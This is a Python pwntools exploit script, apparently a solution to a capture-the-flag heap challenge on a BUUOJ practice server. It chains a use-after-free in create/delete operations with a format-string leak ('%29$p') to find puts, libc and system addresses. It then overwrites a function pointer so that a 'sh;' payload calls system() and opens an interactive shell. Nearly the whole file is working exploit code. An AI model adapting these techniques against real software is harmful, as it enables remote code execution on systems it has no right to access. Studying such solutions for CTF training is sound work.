from pwn import *

context.log_level = 'debug'

# p = process('./pwn-f')
p = remote('node3.buuoj.cn',26874)
lib=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
#elf = ELF('./pwn-f')

if args.G:
    gdb.attach(p)

def create(size,data):
	p.recvuntil('t\n')
	p.sendline('create ')
	p.recvuntil('size:')
	p.sendline(str(size))
	p.recvuntil('str:')
	p.send(data)

def delete(num):
	p.recvuntil('t\n')
	p.sendline('delete ')
	p.recvuntil('id:')
	p.sendline(str(num))
	p.recvuntil('sure?:')
	p.send('yes')

create(4,'aaaa')
create(4,'bbbb')

delete(1)
delete(0)

leak = 'a'*24 + '\x1a' # leak puts_addr

create(32,leak)
delete(1)
p.recvuntil('a'*24)
puts_addr = u64(p.recv(6)+'\x00\x00')
print hex(puts_addr)

print_addr = puts_addr - 0xd1a + 0x9d0
print hex(print_addr)
# gdb.attach(p)
delete(0)
leak2 = 'a'*8 + '%29$p' + 'b'*11 + p64(print_addr) # leak libc
create(32,leak2)
delete(1)

padding = lib.sym['_IO_2_1_stdout_']

libc = p.recv()[8:22]

libc_addr = int(libc,16) - padding
system_addr = libc_addr + lib.sym['system']
success(hex(libc_addr))
print hex(libc_addr)
print hex(system_addr)

p.sendline('')
delete(0)
payload =  'sh;' + 'a'*21 + p64(system_addr)
create(32,payload)
delete(1)

p.interactive()
